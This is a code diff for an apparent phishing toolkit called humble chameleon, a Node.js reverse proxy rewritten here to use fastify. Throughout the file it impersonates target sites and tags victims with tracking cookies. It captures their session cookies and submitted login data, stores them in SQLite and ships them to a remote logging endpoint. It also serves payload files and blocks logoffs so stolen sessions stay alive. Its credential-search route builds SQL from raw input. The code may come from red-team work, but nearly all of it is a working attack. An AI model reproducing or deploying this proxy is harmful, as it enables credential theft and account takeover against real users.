@@ -1,46 +1,56 @@
-//
-//                      Project Index
-//
-// Print Banner 
-// =======================================================
-require("./banner.js");
+const fs = require('fs');
+const got = require('got');
+const fastify = require('fastify')({ logger: false })
+const replace = require('buffer-replace')
+const sqlite3 = require('sqlite3').verbose();
+const dateFormat = require('dateformat')
+fastify.register(require('fastify-cookie'))
 
-// Require Modules
-// =======================================================
-https = require("https");
-http = require("http");
-url  = require('url');
-zlib = require('zlib');
-brotli = require('brotli');
-replace = require('buffer-replace');
-fs = require('fs');
-colors = require('colors');
-dateFormat = require('dateformat');
+//display welcome banner
+console.log(fs.readFileSync('./resources/banner.txt','utf8'))
+
+//config for our domains
 config_file = fs.readFileSync("./config.json");
 config = JSON.parse(config_file);
+
+//admin config for the tool
 admin_config_file = fs.readFileSync("./admin_config.json");
 admin_config = JSON.parse(admin_config_file);
-var chameleon = require('./humble_chameleon');
-var route = require('./routes');
-var views = require('./views');
 
-// =======================================================
-// Define some vars for later 
-// =======================================================
-success = "[" + "+".bold.green + "]"
-fail = "[" + "-".bold.red + "]"
-info = "[" + "*".blue + "]"
-access_log = fs.createWriteStream(__dirname + '/logs/access.log', {flags : 'a'});
-error_log = fs.createWriteStream(__dirname + '/logs/error.log', {flags : 'a'});
-creds_log = fs.createWriteStream(__dirname + '/logs/creds.log', {flags : 'a'});
-set_cookie = false;
-victim_cookies = [];
+//define our mime types for custom payload delivery
+mime_file = fs.readFileSync("./wwwroot/mimetypes.json");
+mime_types = JSON.parse(mime_file);
 
-// =======================================================
-// Connect to/create the database
-// =======================================================
-var sqlite3 = require('sqlite3').verbose();
-db = new sqlite3.Database('./db/humble.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
+//add a wildcard type handler for all unsupported types
+fastify.addContentTypeParser('*', function (req, done) {
+  var data = ''
+  req.on('data', chunk => { data += chunk })
+  req.on('end', () => {
+    done(null, data)
+  })
+})
+
+//define our own content parser for JSON
+fastify.addContentTypeParser('application/json', { parseAs: 'string' }, function (req, body, done) {
+  try {
+    var json = body
+    done(null, json)
+  } catch (err) {
+    err.statusCode = 400
+    done(err, undefined)
+  }
+})
+
+fastify.decorateReply('sendFile', filename => {
+  const stream = fs.createReadStream(filename)
+  this.type('text/html').send(stream)
+})
+
+//basic access log for the server
+access_log = fs.createWriteStream("./logs/access.log", {flags:'a'})
+
+//set up the database for local logging
+db = new sqlite3.Database('./logs/humble.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
   if (err) {
     console.error(err.message);
   }
@@ -50,252 +60,345 @@ db = new sqlite3.Database('./db/humble.db', sqlite3.OPEN_READWRITE | sqlite3.OPE
 db.serialize(function() {
   db.run("CREATE TABLE IF NOT EXISTS posts (timestamp TEXT, tracking_id TEXT, domain TEXT, url TEXT, post TEXT)");
   db.run("CREATE TABLE IF NOT EXISTS cookies (timestamp TEXT, tracking_id TEXT, domain TEXT, url TEXT, cookie TEXT)");
-});
- 
-// =======================================================
-//  Create Server
-// =======================================================
+})
 
-var humble_chameleon = http.createServer(function(victim_request, humble_response){ 
+var new_entry = function(table, tracking_id, data, callback){
+  db.serialize(function() {
+    let select = ""
+    if(table == "cookies"){
+      select = "SELECT cookie FROM cookies WHERE tracking_id = ? AND cookie = ?"
+    }else{
+      select = "SELECT post FROM posts WHERE tracking_id = ? AND post = ?"
+    }
+    db.get(select, [tracking_id, data], (err, row) => {
+      if (err) {
+        return console.error(err.message)
+      }
+      if (row) {
+        //console.log("skipping duplicate:" + data)
+      }else{
+        callback()
+      }
+    })
+  })
+}
 
-  //get some target configs to set up a request to the real site
-  requested_domain = victim_request.headers.host
-  split_domain = requested_domain.split('.')
-  split_domain.shift()
-  if(split_domain.length < 2){
-    humble_domain = requested_domain
+var log_local = function(table, tracking_id, domain, url, data){
+  if(table == "cookies"){
+    var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)")
+    stmt.run(dateFormat("isoDateTime"), tracking_id, domain, url, data)
   }else{
-    humble_domain = split_domain.join('.')
+    var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?,?)")
+    stmt.run(dateFormat("isoDateTime"), tracking_id, domain, url, data)
   }
+}
 
-  //set our own attribute to track actual IP and remove the extra header so the target server can't see it ;)
-  victim_request.x_real_ip = victim_request.headers['x-real-ip']
-  delete victim_request.headers['x-real-ip']
+var ship_logs = function(log_data, domain_config){
+  var headers = { 
+    'Content-Type': 'application/json',
+    'Cookie': domain_config.logging_endpoint.auth_cookie
+  } 
+  //send logs off to our phishing server/logging endpoint
+  got.post("https://" + domain_config.logging_endpoint.host + domain_config.logging_endpoint.url , {
+    headers: headers,
+    rejectUnauthorized: false,
+    json: log_data
+  }).catch(function(err){
+    console.log("Logging Endpoint Failed: https://" + domain_config.logging_endpoint.host + domain_config.logging_endpoint.url)
+    console.log("Error:" + err)
+    //console.log("Error:" + err.response.body)
+    return
+  })
+}
 
-  //set up logging function here so that routes can use it if need be
-  var ship_logs = function(log_data){
-    if((typeof config[humble_domain].logging_endpoint.host) != 'undefined'){
-      var headers = { 
-        'Content-Type': 'application/json',
-        'Cookie': config[humble_domain].logging_endpoint.auth_cookie,
-        'Content-Length': Buffer.byteLength(JSON.stringify(log_data))
-      };  
-      // Configure the request
-      var options = { 
-        hostname: config[humble_domain].logging_endpoint.host,
-        path: config[humble_domain].logging_endpoint.url,
-        method: 'POST',
-        headers: headers
-      };  
-  
-      var post_request =  https.request(options,  (resp) => {
-        let data = ''; 
-  
-        resp.on('data', (chunk) => {
-          data += chunk;
-        }); 
-  
-        resp.on('end', () => {
-          //console.log(data)
-        }); 
-  
-      }).on("error", (err) => {
-        console.log("Error sending logs to endpoint: " + err.message);
-      }); 
-  
-      post_request.write(JSON.stringify(log_data))
-      post_request.end()
-    }
-  }
-
-  //get target from domain's config
-  var target_object = route.getTarget(humble_domain, victim_request, ship_logs)
-  target = target_object.target
-
-  http_method = victim_request.method
-  substitution_regex = RegExp(target, 'gi')
-  //escape dangerous chars first
-  reverse_sub_regex = RegExp(humble_domain.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&'), 'gi')
-  postData = '';
-
-  //collect any data from the body of the request
-  //likely a POST request with some interesting data
-  victim_request.on('data', function (data) {
-    postData += data;
-  });
-
-  //wait for the end of the request to begin the proxy steps
-  victim_request.on('end', function () {
-
-    options = {
-      host: victim_request.headers.host.replace(humble_domain, target),
-      port: 443,
-      path: url.parse(victim_request.url).path.replace(reverse_sub_regex, target),
-      method: http_method,
-      //wierd but it works somehow... Just the string will break a bunch of stuff
-      headers: JSON.parse(JSON.stringify(victim_request.headers).replace(reverse_sub_regex, target))
-    };
-
-    let victim_cookies = options.headers.cookie;
-    if((typeof victim_cookies) == 'undefined'){
-      victim_cookies = ''
-    }
-
-    if((typeof config[humble_domain]) != 'undefined'){
-      //check to see if we have some cookies to save in the DB but don't save if it's just an amdin
-      if ((options.headers.cookie != null) && !(options.headers.cookie.includes(admin_config.admin_cookie.cookie_name))) {
-        //create a db entry for it for our admin interface
-        db.serialize(function() {
-          var select = "SELECT cookie FROM cookies WHERE domain = ? AND cookie = ?"
-          db.get(select, [requested_domain, JSON.stringify(victim_cookies)], (err, row) => {
-            if (err) {
-              return console.error(err.message);
-            }
-            //skip the cookie if we already captured it
-            if (row) {
-              //console.log("skipping previously captured cookie")
-  	  //only capture cookies for actual victims
-  	  } else if(victim_cookies.includes(config[humble_domain].tracking_cookie)){
-              try{
-                let tracking_search = new RegExp(config[humble_domain].tracking_cookie + '=([^;]*)(;|$)', 'i')
-                //get first capture group of our regex
-                tracking_id = tracking_search.exec(victim_cookies)[1]
-                console.log(success + "Captured cookie: " + JSON.stringify(victim_cookies));
-                access_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
-                creds_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
-                var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)");
-                stmt.run(dateFormat("isoDateTime"),tracking_id,requested_domain,url.parse(victim_request.url).path, JSON.stringify(victim_cookies) )
-                stmt.finalize();
-                ship_logs({"event_ip": victim_request.x_real_ip,"target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(victim_cookies)})
-  	    }catch(err){
-                //console.log(err)
-  	      console.log("Error processing tracking cookie: " + victim_cookies)
-  	    }
-            }
-          });
-        });
-      }
-    }
-  
+async function humble_proxy(request, reply){
+  myreq = request.req
+  client_ip = myreq.headers['x-real-ip']
+  client_protocol = myreq.headers['x-real-protocol']
+  //set up a fallback in case we get a request for a domain that does not have a config
+  let domain_config = config["fallback_config"]
+  //TODO make better assumptions on the default domain as a fallback
+  let humble_domain = myreq.hostname
+  //find out wich domain config to use
+  Object.keys(config).forEach(function(key) {
+    if(myreq.hostname.includes(key)){
+      domain_config = config[key]
+      humble_domain = key 
+    } 
+  })
+  //directly deliver file if the url contains our wwwroot search string
+  if(myreq.url.includes(domain_config.wwwroot)){
     try {
-      var admin = options.headers.cookie.includes(admin_config.admin_cookie.cookie_name + "=" + admin_config.admin_cookie.cookie_value)
-      if(admin){
-        //remove the admin cookie from the request so that the real sever doesn't see it
-        admin_cookie_regex = RegExp(admin_config.admin_cookie.cookie_name + '.?=.?' + admin_config.admin_cookie.cookie_value + '.?;? ?', 'gi')
-        options.headers.cookie = options.headers.cookie.replace(admin_cookie_regex, '')
-      }
+      let file_name = myreq.url.split('/').pop().split('?')[0]
+      let extention = file_name.split('.')[1]
+      let mime_type = mime_types[extention]
+      let stream = fs.createReadStream('./wwwroot/' + file_name)
+      reply.type(mime_type).send(stream)
+      click_id = request.query[domain_config.search_string]
+      ship_logs({"event_ip": client_ip, "target": click_id, "event_type": "DIRECT_DOWNLOAD", "event_data": file_name}, domain_config)
+      access_log.write(JSON.stringify({"event_ip": client_ip, "target": click_id, "event_type": "DIRECT_DOWNLOAD", "event_data": file_name}) + "\n")
     } catch(err) {
-      var admin = false
+      console.log("Coundn't Find  File in wwwroot: " + file_name)
+      reply.send("")
     }
-    //redirect to the real site if we see the snitch
-    if (target_object.target_type == "snitch") {
-      views.redirect(target_object.target, humble_response)
-    //deliver a file from our special directory
-    } else if (target_object.target_type == "payload") {
-      views.deliver_file(target_object.target, humble_response)
-    //set our admin cookie one time if the config tells us to
-    } else if (target_object.target_type == "set_cookie") {
-      views.set_cookie(target_object.target, humble_response)
-    } else if (admin && (options.path.includes("config"))) {
-      //log who is accessing the admin consoles
-      console.log(success + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path)
-      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
-      views.adminConfig(victim_request, humble_response);
-    } else if (admin && (options.path.includes("access"))) {
-      //log who is accessing the admin consoles
-      console.log(success + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path)
-      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
-      views.accessLog(victim_request, humble_response);
-    } else if (admin && (options.path.includes("credz"))) {
-      //log who is accessing the admin consoles
-      console.log(success + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path)
-      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
-      views.credsLog(victim_request, humble_response);
-    } else {
-      //remove any reference to the evil cookie if it is being used
-      evil_cookie_regex = RegExp(config[humble_domain].tracking_cookie + '=[^;]*;|$', 'i')
-      try{
-        options.headers.cookie = options.headers.cookie.replace(evil_cookie_regex, '')
-      }catch(err){
-        //no cookies
-      }
-      //we're running the attack so sub refs to our phishing domain
-      postData = postData.replace(reverse_sub_regex, target)
-      //and adjust the payload length
-      options.headers['content-length'] = postData.length.toString()
-      //make a request to the real server and pipe the response back to the victim
-      var req = https.request(options, chameleon.humbleProxy(victim_request, humble_response));
-
-      req.on('error', function(err) {
-        console.log(fail + dateFormat("isoDateTime") + " " + 'Caught exception: ', err);
-        error_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
-        access_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
-      });
-    
-
-      //make sure to log any POST data we captured
-      if (http_method == "POST") {
-        //log any real POST data to the files at least JIC
-        if (postData.length > 5) {
-          console.log(success + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData)
-          creds_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData + "\n")
-          access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData + "\n")
-        }
-        //try to just get logins for the credz log and shippling logs
-        if (postData.match(/usr|user|login|pass|psw|auth/ig)) {
-          //only log data for our victims
-	  if(victim_cookies.includes(config[humble_domain].tracking_cookie)){
-            let tracking_search = new RegExp(config[humble_domain].tracking_cookie + '=([^;]*)(;|$)', 'i')
-            tracking_id = tracking_search.exec(victim_cookies)[1]
-            try{
-              var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?,?)");
-              stmt.run(dateFormat("isoDateTime"),tracking_id,options.host,options.path,postData)
-              stmt.finalize();
-              ship_logs({"event_ip": victim_request.x_real_ip,"target": tracking_id, "event_type": "POST_DATA", "event_data": postData})
-	    }catch(err){
-              //console.log(err)
-	      console.log("Error processing post data: " + postData)
-	    }
-          }
-        }
-        req.write(postData.replace(reverse_sub_regex, target))
-        console.log(postData.replace(reverse_sub_regex, target))
-      }
-      //close the web request after we've used it
-      req.end();
+  //add a "snitch" feature to redirect logoff attempts and keep our sessions alive based on the config
+  }else if(myreq.url.includes(domain_config.snitch.snitch_string)){
+    reply.redirect(domain_config.snitch.redirect_url)
+  //otherwise run a MitM attack against our target domains based on the config
+  }else{
+    //set up the default MitM target to the hide behind domain
+    let target_domain = domain_config.primary_target
+    let tracking_id = ''
+    //target the real domain if we have already seen this user
+    if(typeof (request.cookies[domain_config.tracking_cookie]) != 'undefined'){
+      target_domain = domain_config.secondary_target
+      tracking_id = request.cookies[domain_config.tracking_cookie]
     }
-  });//end victim request callback function
+    //check if we have a click with the correct GET param to track the user
+    if(typeof (request.query[domain_config.search_string]) != 'undefined'){
+      target_domain = domain_config.secondary_target
+      reply.setCookie(domain_config.tracking_cookie, request.query[domain_config.search_string], {path: '/', httpOnly: true, secure: true, maxAge: 31536000, domain: humble_domain})
+      tracking_id = request.query[domain_config.search_string]
+      ship_logs({"event_ip": client_ip, "target": tracking_id, "event_type": "CLICK", "event_data": myreq.url}, domain_config)	
+      access_log.write(JSON.stringify({"event_ip": client_ip, "target": tracking_id, "event_type": "CLICK", "event_data": myreq.url}) + "\n")
+    }
+    sub_humble_to_target = RegExp(humble_domain, 'ig')
+    myreq.hostname = myreq.hostname.replace(sub_humble_to_target, target_domain)
+    //swap all references of our domain with the target domain in the headers
+    myreq.headers = JSON.parse(JSON.stringify(myreq.headers).replace(sub_humble_to_target, target_domain))
+    //and custom substitutions
+    Object.keys(domain_config.replacements).forEach(function(key) {
+      let global_sub = RegExp(domain_config.replacements[key], 'ig')
+      myreq.headers = JSON.parse(JSON.stringify(myreq.headers).replace(global_sub, key))
+    }) 
+    if((typeof myreq.headers.cookie) != 'undefined'){
+      //don't leak our admin cookie or tracking cookies to any target domains
+      admin_cookie_regex = RegExp(admin_config.admin_cookie.cookie_name + '.?=.?' + admin_config.admin_cookie.cookie_value + '.?;? ?', 'gi')
+      tracking_cookie_regex = new RegExp(domain_config.tracking_cookie + '=([^;]*)(;|$)', 'i')
+      myreq.headers.cookie = myreq.headers.cookie.replace(admin_cookie_regex, '').replace(tracking_cookie_regex, '')
+      //ship logs if we get some cookies so we can steal sessions
+      if(tracking_id != '' & Object.keys(request.cookies).length > 1){
+        delete request.cookies[domain_config.tracking_cookie]
+        //only log previously unrecorded cookies
+        new_entry('cookies', tracking_id, JSON.stringify(request.cookies), function(){
+          log_local('cookies', tracking_id, target_domain, myreq.url, JSON.stringify(request.cookies))
+          ship_logs({"event_ip": client_ip, "target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(request.cookies)}, domain_config)	
+          access_log.write(JSON.stringify({"event_ip": client_ip, "target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(request.cookies)})+"\n")
+	})
+      }
+    } 
+    //x-real-ip is for internal tracking use only. Don't let the server see it
+    delete myreq.headers['x-real-ip']
+    delete myreq.headers['x-real-protocol']
+    request_options = {
+      followRedirect: false,
+      throwHttpErrors: false,
+      rejectUnauthorized: false,
+      headers: myreq.headers,
+      method: myreq.method
+    }
+    if(request.body != null){
+      //swap refrences in the body as well
+      request_options.body = request.body.replace(sub_humble_to_target, target_domain)
+      //and custom subs
+      Object.keys(domain_config.replacements).forEach(function(key) {
+        let global_sub = RegExp(domain_config.replacements[key], 'ig')
+        request_options.body = request_options.body.replace(global_sub, key)
+      })
+      console.log(request_options.body)
+      myreq.headers["Content-Length"] = request_options.body.length
+      if(tracking_id != ''){
+        new_entry('posts', tracking_id, request.body, function(){
+          log_local('posts', tracking_id, target_domain, myreq.url, request.body)
+          ship_logs({"event_ip": client_ip, "target": tracking_id, "event_type": "POST_DATA", "event_data": request.body}, domain_config)
+          access_log.write(JSON.stringify({"event_ip": client_ip, "target": tracking_id, "event_type": "POST_DATA", "event_data": request.body})+"\n")
+	})
+      }
+    }
+    console.log(client_ip + ":" +  myreq.method + ":" + client_protocol + "://" + myreq.hostname + myreq.url)
+    access_log.write(client_ip + ":" +  myreq.method + ":" + client_protocol + "://" + myreq.hostname + myreq.url + "\n")
+    //swap all references of our domain with the target domain in the URL
+    myreq.url = myreq.url.replace(sub_humble_to_target, target_domain)
+    //and custom subs as well
+    Object.keys(domain_config.replacements).forEach(function(key) {
+      let global_sub = RegExp(domain_config.replacements[key], 'ig')
+      myreq.url = myreq.url.replace(global_sub, key)
+    })
+    response = await got(client_protocol + "://" + myreq.hostname + myreq.url, request_options).catch(function(err){
+      console.log("problem with:" + client_protocol + "://" + myreq.hostname + myreq.url)
+      reply.send()
+      return
+    })
+    sub_target_to_humble = RegExp(target_domain, 'ig')
+    response.rawBody = replace(response.rawBody, target_domain, humble_domain)
+    //handle any custom additional replacements in the body
+    Object.keys(domain_config.replacements).forEach(function(key) {
+      response.rawBody = replace(response.rawBody, key, domain_config.replacements[key])
+    }) 
+    //swap domain references in the headers
+    reply.headers(JSON.parse(JSON.stringify(response.headers).replace(sub_target_to_humble, humble_domain)))
+    //and the custom subs as well
+    //Object.keys(domain_config.replacements).forEach(function(key) {
+      //let global_sub = RegExp(key, 'ig')
+      //reply.headers(JSON.parse(JSON.stringify(response.headers).replace(global_sub, domain_config.replacements[key])))
+    //})
+    reply.headers({"content-encoding": "none"})
+    reply.headers({"Content-Length": response.rawBody.length})
+    //console.log(reply.headers())
+    reply.code(response.statusCode)
+    reply.send(response.rawBody)
+  }
+}
 
-})//end server definition
+//catchall route for the attack
+fastify.route({
+  method: ['DELETE', 'GET', 'HEAD', 'PATCH', 'POST', 'PUT', 'OPTIONS'],
+  url: '/*',
+  handler: async function (request, reply) {
+    humble_proxy(request, reply)
+  }
+})
 
-humble_chameleon.listen(8000)
+//route to view and modify the current config
+fastify.route({
+  method: ['GET'],
+  url: '/config',
+  handler: async function (request, reply) {
+    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
+      let stream = fs.createReadStream('./resources/config_page.html')
+      reply.type('text/html').send(stream)
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
 
-//catch any server exceptions instead of exiting
-humble_chameleon.on('error', function (e) {
-  console.log(fail + dateFormat("isoDateTime") + " " + e);
-  error_log.write("[-]" + dateFormat("isoDateTime") + " " + e + "\n");
-  access_log.write("[-]" + dateFormat("isoDateTime") + " " + e + "\n");
-});
+//route to get the current config
+fastify.route({
+  method: ['PUT'],
+  url: '/config',
+  handler: async function (request, reply) {
+    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
+      reply.type('application/json').send(JSON.stringify(config))
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
 
-//catch any node exceptions instead of exiting
-process.on('uncaughtException', function (err) {
-  console.log(fail + dateFormat("isoDateTime") + " " + 'Caught exception: ', err);
-  error_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
-  access_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
-});
+//route to save config changes
+fastify.route({
+  method: ['POST'],
+  url: '/config',
+  handler: async function (request, reply) {
+    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
+      try {
+        config = JSON.parse(decodeURIComponent(request.body))
+        fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));
+        console.log("Updated Config File: " + decodeURIComponent(request.body))
+        reply.send("Successfully Saved Config")
+      } catch(err) {
+        reply.send("problem with config: " + err)
+      }
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
 
-//catch ctrl-c
-process.on('SIGINT', function() {
-  console.log("Caught keyboard kill signal");
-  db.close((err) => {
+//route to view and search creds 
+fastify.route({
+  method: ['GET'],
+  url: '/credz',
+  handler: async function (request, reply) {
+    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
+      let stream = fs.createReadStream('./resources/credz_page.html')
+      reply.type('text/html').send(stream)
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
+
+//route to run cred search queries as an API
+fastify.route({
+  method: ['POST'],
+  url: '/credz',
+  handler: async function (request, reply) {
+    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
+      var search = JSON.parse(request.body)
+      db.serialize(function() {
+        let sql = "SELECT * FROM cookies WHERE timestamp LIKE '%" + search.timestamp + "%' AND domain LIKE '%" + search.domain + "%' AND cookie LIKE '%" + search.data + "%'" 
+        let cookies = []
+        let posts = []
+        db.each(sql, function(err, cookie) {
+          cookies.push(cookie)
+        }); 
+        sql = "SELECT * FROM posts WHERE timestamp LIKE '%" + search.timestamp + "%' AND domain LIKE '%" + search.domain + "%' AND url LIKE '%" + search.url + "%' AND post LIKE '%" + search.data + "%'" 
+        db.each(sql, function(err, post) {
+          posts.push(post)
+        }, function(){
+          reply.type('application/json').send(JSON.stringify({"cookies": cookies, "posts": posts}))
+        })
+      })
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
+
+//route to deliver resource files for special pages
+fastify.route({
+  method: ['GET'],
+  url: '/humbleflair/*',
+  handler: async function (request, reply) {
+    if(request.cookies[admin_config.admin_cookie.cookie_name] == admin_config.admin_cookie.cookie_value){
+      let resource_file = request.raw.url.split('humbleflair')[1]
+      let stream = fs.createReadStream('./resources/lib' + resource_file)
+      reply.send(stream)
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
+
+//route to set our admin cookie based on the admin config
+fastify.route({
+  method: ['GET'],
+  url: '/' + admin_config.set_admin.search_string,
+  handler: async function (request, reply) {
+    if(admin_config.set_admin.switch){
+      myreq = request.req
+      try {
+        let humble_domain = myreq.hostname
+        //find out wich domain config to use
+        Object.keys(config).forEach(function(key) {
+          if(myreq.hostname.includes(key)){
+            humble_domain = key 
+          } 
+        })
+        //turn the switch back off and save to disk in case of a restart
+        admin_config.set_admin.switch = false
+        fs.writeFileSync('./admin_config.json', JSON.stringify(admin_config, null, 4))
+	reply.setCookie(admin_config.admin_cookie.cookie_name, admin_config.admin_cookie.cookie_value, {path: '/', httpOnly: true, secure: true, maxAge: 31536000, domain: humble_domain})
+        reply.redirect("https://" + myreq.hostname + "/config" )
+      } catch(err) {
+        reply.send("problem setting cookie: " + err)
+      }
+    }else{
+      humble_proxy(request, reply)
+    }
+  }
+})
+
+// Run the server!
+const start = async () => {
+  fastify.listen(8000, (err) => {
     if (err) {
-      console.error(err.message);
-      process.exit();
+      fastify.log.error(err)
+      process.exit(1)
     }
-    console.log('Closing the humble database connection.');
-    process.exit();
-  });
-});
-
-//ignore ssl errors from our target service
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
+    fastify.log.info(`server listening on ${fastify.server.address().port}`)
+  })
+}
+start()
